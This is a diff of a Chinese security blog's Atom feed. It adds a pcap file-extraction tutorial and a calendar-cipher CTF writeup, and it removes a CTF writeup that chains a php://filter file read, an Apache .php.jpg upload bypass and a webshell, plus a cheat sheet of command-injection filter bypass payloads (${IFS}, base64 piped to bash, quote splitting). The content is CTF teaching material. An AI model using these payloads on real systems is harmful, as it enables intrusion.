@@ -261,6 +261,88 @@
   </entry>
   
   <entry>
+    <title>流量包提取文件方法</title>
+    <link href="http://yoursite.com/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"/>
+    <id>http://yoursite.com/2017/08/25/流量包提取文件方法/</id>
+    <published>2017-08-25T09:18:24.000Z</published>
+    <updated>2017-08-25T10:30:59.016Z</updated>
+    
+    <content type="html"><![CDATA[<p>流量包提取文件方法<br><a id="more"></a></p>
+<h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p>wrieshark自带有文件分离功能。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/3.png?raw=true" alt=""></p>
+<h1 id="tcpxtract"><a href="#tcpxtract" class="headerlink" title="tcpxtract"></a>tcpxtract</h1><p>通过下面命令安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install tcpxtract</div></pre></td></tr></table></figure></p>
+<p>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpxtract -f XXX.pcap</div></pre></td></tr></table></figure></p>
+<p>以hitctf2017的Cephalopod为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/hitb2017/misc/Cephalopod# tcpxtract -f 2a9c1cdd-2ac0-4b2a-828d-269c6e04ebbb.pcap</div><div class="line">Found file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000000.png</div><div class="line">Found file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000001.png</div></pre></td></tr></table></figure></p>
+<p>即可得到藏在流量包里的文件：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/1.png?raw=true" alt=""></p>
+<h1 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h1><p>foremost是基于文件头及尾部信息恢复文件的工具。</p>
+<p>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">foremost -i XXX.pcap</div></pre></td></tr></table></figure></p>
+<p>以hitbctf2017的simple_transfer为例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# foremost -i b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap</div><div class="line">Processing: b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap</div><div class="line">|*|</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# ls</div><div class="line">b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap  output</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# cd output/</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer/output# ls</div><div class="line">audit.txt  pdf</div></pre></td></tr></table></figure>
+<p>即可恢复出藏在流量包里的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/2.png?raw=true" alt=""></p>
+<h1 id="Network-miner"><a href="#Network-miner" class="headerlink" title="Network miner"></a>Network miner</h1><p>下载地址：<a href="https://sourceforge.net/projects/networkminer/" target="_blank" rel="external">https://sourceforge.net/projects/networkminer/</a></p>
+<p>还有一些方法，遇到后再慢慢补充。</p>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
+<li><a href="http://bbs.pediy.com/thread-220021.htm" target="_blank" rel="external">CTF取证类题目指南</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/206.html" target="_blank" rel="external">返璞归真——流量中提取文件的五种方法</a></li>
+<li><a href="https://www.blackbytes.info/2012/01/four-ways-to-extract-files-from-pcaps/" target="_blank" rel="external">Four ways to extract files from pcaps</a></li>
+<li><a href="https://github.com/caesar0301/awesome-pcaptools" target="_blank" rel="external">awesome-pcaptools</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;流量包提取文件方法&lt;br&gt;
+    
+    </summary>
+    
+      <category term="技术杂谈" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
+    
+    
+      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
+    
+      <category term="pcap" scheme="http://yoursite.com/tags/pcap/"/>
+    
+      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HITB CTF 2017-Dating in Singapore-writeup</title>
+    <link href="http://yoursite.com/2017/08/24/HITB-CTF-2017-Dating-in-Singapore-writeup/"/>
+    <id>http://yoursite.com/2017/08/24/HITB-CTF-2017-Dating-in-Singapore-writeup/</id>
+    <published>2017-08-24T08:58:25.000Z</published>
+    <updated>2017-08-25T10:30:52.002Z</updated>
+    
+    <content type="html"><![CDATA[<p>HITB CTF 2017-Dating in Singapore-writeup<br><a id="more"></a></p>
+<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">01081522291516170310172431-050607132027162728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>根据分隔符<code>-</code>分开每行，并且两两数字一组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">01 08 15 22 29 15 16 17 03 10 17 24 31</div><div class="line"></div><div class="line">05 06 07 13 20 27 16 27 28</div><div class="line"></div><div class="line">01 02 03 02 09 16 23 30</div><div class="line"></div><div class="line">02 09 16 23 02 03 10 09 09 10 17 24 23</div><div class="line"></div><div class="line">02 01 08 14 22 29 30</div><div class="line"></div><div class="line">06 05 04 11 18 25 26 27</div><div class="line"></div><div class="line">02 03 04 03 10 17 24 31</div><div class="line"></div><div class="line">01 02 03 01 08 15 22 29 15 16 17</div><div class="line"></div><div class="line">04 05 06 04 11 18 25 18 19 20</div><div class="line"></div><div class="line">01 08 15 22 29 30 31 24 17 10 03</div><div class="line"></div><div class="line">26 19 12 05 20 28 21 14 07</div><div class="line"></div><div class="line">04 05 12 13 19 26 25</div></pre></td></tr></table></figure></p>
+<p>数字的特征，最小为01，最大为31，一共十二行，恰对应12个月，每个月最多31天。结合今年（2017）日历</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170824/1.png?raw=true" alt=""></p>
+<p>第一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">01 08 15 22 29 15 16 17 03 10 17 24 31</div></pre></td></tr></table></figure></p>
+<p>对照一月份，“写出”得到字母：<code>H</code>。</p>
+<p>其余类似。</p>
+<p>最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HITB&#123;CTFFUN&#125;</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;HITB CTF 2017-Dating in Singapore-writeup&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Crypto" scheme="http://yoursite.com/categories/writeup-Crypto/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Sqli-Labs:Less17-writeup</title>
     <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less17-writeup/"/>
     <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less17-writeup/</id>
@@ -1631,120 +1713,6 @@
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
     
       <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XNUCA 2017-Web专题赛前指导-Document-writeup</title>
-    <link href="http://yoursite.com/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/"/>
-    <id>http://yoursite.com/2017/08/16/XNUCA-2017-Web专题赛前指导-Document-writeup/</id>
-    <published>2017-08-16T11:10:23.000Z</published>
-    <updated>2017-08-18T11:46:49.778Z</updated>
-    
-    <content type="html"><![CDATA[<p>php伪协议 文件读取  文件上传绕过  apache解析漏洞<br><a id="more"></a></p>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>查看源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=&quot;en&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">    &lt;title&gt;Document&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;!-- include.php --&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
-<p>发现有include.php，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/include.php</div></pre></td></tr></table></figure></p>
-<p>提示 the parameter is file! :) 。同时查看源代码有upload.php，是个上传页面。</p>
-<p>利用php伪协议读取源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/include.php?file=php://filter/read=convert.base64-encode/resource=include</div></pre></td></tr></table></figure></p>
-<p>include.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">Tips: the parameter is file! :)</div><div class="line">&lt;!-- upload.php --&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    @$file = $_GET[<span class="string">"file"</span>];</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">include</span>($file.<span class="string">'.php'</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>读取upload源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/include.php?file=php://filter/read=convert.base64-encode/resource=upload</div></pre></td></tr></table></figure></p>
-<p>upload.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">""</span> enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span></div><div class="line">name=<span class="string">"upload"</span>&gt;file:&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;&lt;br&gt;</div><div class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload"</span> /&gt;&lt;/form&gt;</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>];</div><div class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</div><div class="line">    @$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">    $extension = end($temp);</div><div class="line">    <span class="keyword">if</span> (((@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">    || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</div><div class="line">    || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>) || (@$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</div><div class="line">    &amp;&amp; (@$_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">102400</span>) &amp;&amp; in_array($extension, $allowedExts))</div><div class="line">    &#123;</div><div class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">        <span class="keyword">echo</span> <span class="string">"file upload successful!Save in:  "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"upload failed!"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>随手上传了一个 god4.php.jpg</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/3.png?raw=true" alt=""></p>
-<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20129/upload/god4.php.jpg</div></pre></td></tr></table></figure></p>
-<p>被解析了，应该是因为apache的缘故，不识别jpg，然后向前递归解析了php。既然能解析，那就用菜刀连上去：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/4.png?raw=true" alt=""></p>
-<p>在虚拟终端中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find / | grep flag</div></pre></td></tr></table></figure></p>
-<p>然后发现有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/.sshkey/flag.txt</div></pre></td></tr></table></figure></p>
-<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[/var/www/html/upload/]$ cat /etc/.sshkey/flag.txt</div><div class="line">7F5A58DFC54CFAC9903FE85D92703787</div></pre></td></tr></table></figure></p>
-<p>这题也有多种解法，因为在include.php中可以发现，没有对zip或者phar协议等进行过滤，可以利用这些协议进行直接的文件包含。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;php伪协议 文件读取  文件上传绕过  apache解析漏洞&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>命令执行的一些绕过技巧</title>
-    <link href="http://yoursite.com/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
-    <id>http://yoursite.com/2017/08/15/命令执行的一些绕过技巧/</id>
-    <published>2017-08-15T11:05:33.000Z</published>
-    <updated>2017-08-18T11:49:18.603Z</updated>
-    
-    <content type="html"><![CDATA[<p>命令执行的一些绕过技巧<br>已收录至: <a href="https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html" target="_blank" rel="external">WAF-Bypass</a><br><a id="more"></a></p>
-<h1 id="多条命令"><a href="#多条命令" class="headerlink" title="多条命令"></a>多条命令</h1><h2 id="法一：-逻辑运算符"><a href="#法一：-逻辑运算符" class="headerlink" title="法一： 逻辑运算符"></a>法一： 逻辑运算符</h2><h1 id="绕过escapeshellcmd"><a href="#绕过escapeshellcmd" class="headerlink" title="绕过escapeshellcmd"></a>绕过escapeshellcmd</h1><h2 id="法一：win下执行bat"><a href="#法一：win下执行bat" class="headerlink" title="法一：win下执行bat"></a>法一：win下执行bat</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$command = <span class="string">'dir '</span>.$_POST[<span class="string">'dir'</span>];</div><div class="line">$escaped_command = escapeshellcmd($command);</div><div class="line">var_dump($escaped_command);</div><div class="line">file_put_contents(<span class="string">'out.bat'</span>,$escaped_command);</div><div class="line">system(<span class="string">'out.bat'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dir=../ %1a whoami</div></pre></td></tr></table></figure></p>
-<h2 id="法二：宽字节注入"><a href="#法二：宽字节注入" class="headerlink" title="法二：宽字节注入"></a>法二：宽字节注入</h2><p>php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">escapeshellcmd(&quot;echo &quot;.chr(0xc0).&quot;;id&quot;);</div></pre></td></tr></table></figure></p>
-<p>之后该语句会变成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 繺;id</div></pre></td></tr></table></figure></p>
-<p>从而实现 id 命令的注入。</p>
-<h1 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h1><h2 id="法一：-IFS"><a href="#法一：-IFS" class="headerlink" title="法一： ${IFS}"></a>法一： ${IFS}</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat flag</div><div class="line">nice day</div><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
-<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;$9flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
-<p>payload3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
-<h2 id="法二：-重定向符-lt-gt"><a href="#法二：-重定向符-lt-gt" class="headerlink" title="法二： 重定向符&lt;&gt;"></a>法二： 重定向符&lt;&gt;</h2><p>payload1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat&lt;&gt;flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
-<p>payload2：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat&lt;flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
-<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h2 id="法一：-拼接"><a href="#法一：-拼接" class="headerlink" title="法一： 拼接"></a>法一： 拼接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ a=c;b=at;c=flag;$a$b $c</div><div class="line">nice day</div></pre></td></tr></table></figure>
-<h2 id="法二：-利用已存在的资源"><a href="#法二：-利用已存在的资源" class="headerlink" title="法二： 利用已存在的资源"></a>法二： 利用已存在的资源</h2><p>从已有的文件或者环境变量中获得相应的字符。</p>
-<h2 id="法三：-base64编码"><a href="#法三：-base64编码" class="headerlink" title="法三： base64编码"></a>法三： base64编码</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ `echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
-<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
-<h2 id="法四：-单引号、双引号"><a href="#法四：-单引号、双引号" class="headerlink" title="法四： 单引号、双引号"></a>法四： 单引号、双引号</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
-<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&quot;&quot;ag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
-<p>payload3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&apos;&apos;ag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
-<h2 id="法五：反斜线"><a href="#法五：反斜线" class="headerlink" title="法五：反斜线 \"></a>法五：反斜线 \</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c\at fl\ag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
-<h1 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h1><h1 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(strlen($_GET[test])&lt;<span class="number">8</span>)&#123;</div><div class="line"><span class="keyword">echo</span> shell_exec($_GET[test]);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<h2 id="文件构造"><a href="#文件构造" class="headerlink" title="文件构造"></a>文件构造</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a&gt;wget</div></pre></td></tr></table></figure></p>
-<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1&gt;wget</div></pre></td></tr></table></figure></p>
-<p>payload3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;wget</div></pre></td></tr></table></figure></p>
-<p>将会创建一个名字为wget的空文件。payload1会报错，payload2不会报错。.</p>
-<h1 id="LINUX下一些已有字符"><a href="#LINUX下一些已有字符" class="headerlink" title="LINUX下一些已有字符"></a>LINUX下一些已有字符</h1><ul>
-<li>${PS2} 对应字符 ‘&gt;’</li>
-<li>${PS4} 对应字符 ‘+’</li>
-<li>${IFS} 对应 内部字段分隔符</li>
-<li>${9} 对应 空字符串</li>
-</ul>
-<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul>
-<li><a href="https://github.com/ewilded/shelling" target="_blank" rel="external">shelling
-</a></li>
-</ul>
-<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
-<li><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="external">PHP绕过open_basedir列目录的研究</a></li>
-<li><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="external">eval长度限制绕过 &amp;&amp; PHP5.6新特性</a></li>
-<li><a href="https://www.leavesongs.com/PENETRATION/nginx-deny-exec-php-file.html" target="_blank" rel="external">关于lnmp目录禁止执行的绕过与正确方法</a></li>
-<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="external">一些不包含数字和字母的webshell</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3271.html" target="_blank" rel="external">php webshell分析和绕过waf技巧</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3192.html" target="_blank" rel="external">【技术分享】命令执行和绕过的一些小技巧</a></li>
-<li><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="external">浅谈CTF中命令执行与绕过的小技巧</a></li>
-<li><a href="http://www.math1as.com/index.php/archives/484" target="_blank" rel="external">Mathias:命令执行的bypass技巧</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;命令执行的一些绕过技巧&lt;br&gt;已收录至: &lt;a href=&quot;https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html&quot;&gt;WAF-Bypass&lt;/a&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="php" scheme="http://yoursite.com/tags/php/"/>
-    
-      <category term="代码执行" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
